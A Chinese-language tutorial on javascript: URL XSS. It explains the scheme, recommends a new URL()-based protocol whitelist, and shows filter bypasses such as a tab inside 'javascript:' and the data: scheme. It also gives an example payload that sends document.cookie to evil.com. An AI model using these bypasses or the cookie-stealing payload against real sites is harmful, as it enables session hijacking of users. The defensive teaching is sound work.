javascript: URL 的 XSS 實驗室

本檔案完全在你自己的瀏覽器裡跑，沒有任何對外連線。攻擊 payload 只會呼叫 alert() 與寫進下方的紀錄區。

零、先搞懂 javascript: 是什麼

javascript: 是一種 URL scheme（URL 協定），跟 https:、mailto:、tel: 是同一類東西。

URL瀏覽器看到之後做什麼
https://example.com去那個網址抓資源
mailto:a@b.com開啟郵件軟體
tel:0912345678撥號
javascript:alert(1)把冒號後面的文字當 JavaScript 執行

所以 javascript:alert(1) 的意思就是：「執行 alert(1) 這行程式碼」。alert(1) 是跳出一個寫著 1 的彈窗，攻擊者用它當測試訊號——彈窗跳出來就代表「我能在這個網站執行任意 JavaScript」。

二、防護怎麼寫 安全

重點：不要用黑名單擋 javascript: 這個字串，因為它有太多繞過方式（大小寫、前置空白、換行字元、HTML 實體編碼）。要用白名單，只允許你確定安全的協定。

function safeUrl(input) {
  try {
    // 白話講：用瀏覽器內建的 URL 解析器去解析它，
    //         解析失敗（丟出錯誤）就代表這不是合法網址
    const url = new URL(input, window.location.origin)

    // 白話講：只放行這三種協定，其他一律換成無害的 '#'
    const allowed = ['http:', 'https:', 'mailto:']
    return allowed.includes(url.protocol) ? url.href : '#'
  } catch {
    return '#'
  }
}

為什麼用 new URL() 而不是自己比對字串：因為 new URL() 是瀏覽器自己的解析器，它跟真正決定「這個連結要幹嘛」的那段程式碼用同一套規則。自己寫正則表達式，永遠會跟瀏覽器的實際行為有落差，那個落差就是漏洞。

實測：黑名單 vs 白名單

下表是用 Node.js 實際跑出來的。黑名單的寫法是 !s.toLowerCase().includes('javascript:')。

輸入形式黑名單判定new URL() 解出的協定白名單判定
原形 javascript:擋下javascript:擋下 ✅
大小寫混寫 JaVaScRiPt:擋下javascript:擋下 ✅
前置空白／Tab／換行擋下javascript:擋下 ✅
協定中間插 Tab java script:放行 ⚠️javascript:擋下 ✅
換成 data: 協定放行 ⚠️data:擋下 ✅

兩個重點，跟直覺不太一樣：

  • 大小寫混寫和前置空白其實擋得住——因為 includes() 是找子字串，不是完整比對，所以 ' javascript:alert(1)' 裡面還是有 javascript: 這段。很多文章說這能繞過，實測是不行。
  • 真正繞得過去的是「協定中間插 Tab」：java script: 這個字串裡找不到 javascript:（中間卡了一個 Tab），但 WHATWG URL 規範規定解析 URL 時要先移除所有 Tab 與換行字元，所以瀏覽器眼中它就是 javascript:。這就是「你的字串比對」和「瀏覽器的解析器」用不同規則的最好例證。
  • 最致命的其實不是繞過，是漏掉：你擋了 javascript:，那 data:、vbscript:（舊 IE）呢？黑名單的根本問題是你必須窮舉所有壞的，而攻擊者只需要找到一個你沒想到的。

所以黑名單「爛」在哪？不是零效果，是它的失敗方式。
黑名單漏掉時，你不會知道——網站看起來正常，漏洞安靜地躺在那裡。
白名單如果設太嚴，你馬上會知道——使用者抱怨連結點不開，你就去修白名單。
資安上要選「失敗時會被發現」的那一種。

三、javascript:alert(1) 跟 <script>alert(1)</script> 一樣嗎？

執行的結果一樣，但「怎麼進到你的網站」完全不同——而這個差別就是它更難防的原因。

<script>alert(1)</script>javascript:alert(1)
觸發時機解析到就立刻執行要使用者點擊才執行
需要注入什麼一整個 HTML 標籤（需要 < 和 >）只要一個屬性值（一個角括號都不用）
HTML 轉義擋得住嗎擋得住（< 變成 &lt; 就不是標籤了）擋不住（它沒有角括號可以被轉義）
框架的自動防護React／Vue 預設轉義，安全框架不管（React 只印警告）
執行權限完全一樣，都在你網站的 origin 下，能讀 cookie、能發同源請求

最關鍵的是第三列。所有框架的自動轉義都是在處理「角括號」——把 < 換成 &lt;，讓瀏覽器把它當文字。但 javascript:alert(1) 從頭到尾沒有一個角括號，轉義機制根本沒有東西可以轉。

所以它是「繞過 HTML 轉義」的攻擊路徑：網站可能把 <script> 擋得死死的，卻在 href={userInput} 這一行破功。

四、真實情境：誰會打這個？

不是使用者自己打來攻擊自己，是攻擊者填進某個欄位，讓「別人」點到。

情境攻擊者填在哪受害者
個人資料的「我的網站」欄位個人檔案表單任何看他個人頁面並點連結的人
留言／評論裡的連結留言框其他讀者
登入後的轉址參數?redirect=javascript:...被釣魚連結騙去點的人
商品評論的「來源連結」評論表單逛商品頁的買家

真實的 payload 不會是 alert(1)，而是 javascript:fetch('https://evil.com?c='+document.cookie) 這種——把受害者的 cookie 送到攻擊者的伺服器，而受害者只看到連結沒反應。

所以 alert(1) 是研究用的「試紙」：彈窗跳出來就證明這裡可以執行任意 JS，真正的攻擊再換掉那一行就好。
